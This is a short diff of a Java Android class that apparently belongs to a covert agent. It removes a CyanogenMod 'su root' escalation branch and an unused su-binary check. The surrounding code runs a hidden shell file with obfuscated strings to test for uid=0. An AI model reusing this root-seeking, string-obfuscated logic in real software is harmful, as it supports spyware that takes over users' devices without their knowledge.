@@ -137,12 +137,6 @@ public class PackageInfo {
 
 			if (file.exists() && file.canRead()) {
 
-				if (Root.checkCyanogenmod() && Keys.self().wantsPrivilege()) {
-					if (Cfg.SUPPORT_CYANOGENMOD) {
-						Configuration.shellFile = M.e("su root ") + Configuration.shellFileBase;
-					}
-				}
-
 				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
 				String stdout = p.getStdout();
 				if (stdout.startsWith(M.e("uid=0"))) {
@@ -204,25 +198,6 @@ public class PackageInfo {
 				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
 			}
 			return true;
-		}
-
-		return false;
-	}
-
-	// Non dovrebbe servire usarla
-	private static boolean checkSuBinary() {
-		Execute exec = new Execute();
-		ExecuteResult ret = exec.execute("ls -l");
-		Iterator<String> i = (Iterator<String>) ret.stdout;
-
-		if (i == null) {
-			return false;
-		}
-
-		while (i.hasNext()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkSuBinary): " + i.next()); //$NON-NLS-1$
-			}
 		}
 
 		return false;
